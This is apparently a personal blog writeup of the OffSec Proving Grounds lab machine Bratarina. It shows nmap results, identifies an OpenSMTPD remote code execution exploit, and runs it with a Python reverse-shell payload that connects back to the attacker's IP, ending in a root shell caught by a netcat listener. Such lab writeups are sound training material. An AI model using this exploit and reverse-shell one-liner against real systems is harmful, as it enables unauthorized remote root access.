---
title: "Proving grounds Play: Bratarina"
layout: post
date: 2023-10-05 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- SMTP
- RCE
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbdd2cea2f85c589bcfce9a338f0d750 (RSA)
|   256 e3b765c2a78e4529bb62ec301aebed6d (ECDSA)
|_  256 d55b795bce48d85746db594fcd455def (ED25519)
25/tcp  open  smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.212], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
80/tcp  open  http        nginx 1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
|_http-server-header: nginx/1.14.0 (Ubuntu)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 25/tcp  open  smtp - OpenSMTPD

The service OpenSMTPD is vulnerable to [OpenSMTPD 6.6.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47984) vulnerability.

## Foothold

```sh
naveenj@hackerspace:|22:38|~/proving_grounds/Bratarina/exploits$ python3 exploit.py 192.168.192.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.212\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

naveenj@hackerspace:|22:37|~/proving_grounds/Bratarina/exploits$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.212] from (UNKNOWN) [192.168.192.71] 34894
root@bratarina:~# 
```

**Foothold Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).